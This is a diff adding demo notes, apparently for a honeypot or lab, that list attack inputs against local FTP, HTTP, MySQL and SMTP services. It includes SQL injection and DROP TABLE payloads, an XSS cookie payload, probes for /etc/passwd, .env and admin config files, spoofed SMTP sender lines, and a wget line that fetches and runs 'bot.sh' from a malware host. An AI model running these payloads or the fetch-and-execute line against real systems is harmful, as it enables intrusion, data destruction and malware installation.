@@ -1,0 +1,58 @@
+//FTP (port 2121)
+
+# 1. SSH brute force (simple, everyone understands)
+nc localhost 2222
+root
+
+# 2. Recon
+ls -la /etc/passwd
+
+# 3. SQL Injection (crowd pleaser)
+nc localhost 8080
+' OR 1=1; DROP TABLE users;--
+
+# 4. Malware deploy (the scary one — end on this)
+wget http://malware.ru/bot.sh && chmod +x bot.sh && ./bot.sh
+
+
+
+
+
+
+HTTP (port 8080)
+bash# SQL injection
+curl -s http://localhost:8080 -d "' OR 1=1; DROP TABLE users;--"
+
+# Admin panel recon
+curl -s http://localhost:8080/admin/config.php
+
+# XSS
+curl -s http://localhost:8080 -d "<script>document.cookie</script>"
+
+# .env file grab
+curl -s http://localhost:8080/.env
+
+
+
+
+MySQL (port 3307)
+bashrlwrap nc -q 30 localhost 3307
+```
+Then type:
+```
+SELECT * FROM users WHERE id=1 UNION SELECT 1,2,3,4--
+SHOW TABLES
+DROP TABLE users
+
+
+
+
+
+SMTP (port 2525)
+bashrlwrap nc -q 30 localhost 2525
+```
+Then type:
+```
+EHLO attacker.com
+MAIL FROM: hacker@evil.com
+RCPT TO: admin@corp.com
